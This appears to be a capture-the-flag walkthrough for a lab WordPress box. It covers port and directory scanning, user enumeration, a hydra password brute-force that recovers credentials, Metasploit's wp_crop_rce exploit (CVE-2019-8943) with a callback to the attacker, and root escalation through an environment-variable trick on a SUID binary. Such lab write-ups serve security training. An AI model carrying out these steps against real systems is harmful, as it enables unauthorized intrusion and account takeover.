Target: 10.10.121.65

## Enumeration:

nmap 
```bash
$ nmap -sC -sV 10.10.121.65
<snip>
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
<snip>
```

gobuster
```bash
$ gobuster dir -u http://10.10.121.65 -w /usr/share/dirbuster/wordlists/directory-list-2.3.small.txt 
/rss                  (Status: 301) [Size: 0] [--> http://10.10.121.65/feed/]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.121.65/0/]      
/feed                 (Status: 301) [Size: 0] [--> http://10.10.121.65/feed/]   
/atom                 (Status: 301) [Size: 0] [--> http://10.10.121.65/feed/atom/]
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.121.65/wp-content/]
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]        
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.121.65/feed/]        
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.121.65/wp-includes/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.121.65/feed/rdf/]                  
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]                    
/2020                 (Status: 301) [Size: 0] [--> http://10.10.121.65/2020/]         
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.121.65/wp-admin/]   
/0000                 (Status: 301) [Size: 0] [--> http://10.10.121.65/0000/]         
/embed                (Status: 301) [Size: 0] [--> http://10.10.121.65/embed/]
```

robots.txt
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

wpscanner
```bash
$ wpscan --url 10.10.121.65 --enumerate u
<snip>
[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).

<snip>

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.20.26/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.20.26/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
 <snip>
```

trying admin:password
![]()

trying bjoel:password
![]()


hydra
```bash
$ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.121.65 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```

Loot:
kwheel:cutiepie1


## Foothold:

CVE-2019-8943

```bash
$ msfconsole
```

```
search crop-image
use exploit/multi/http/wp_crop_rce
set RHOSTS 10.10.121.65
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST tun0
run

```


## Lateral Movement:

## Privilage EScalation:

```bash
$ find / -perm -u=s -type f 2>/dev/null
<snip>
/usr/sbin/checker
<snip>
```

```bash 
$ ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

``` bash 
$ export admin=1
$ ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
```

``` bash
$ checker 
```
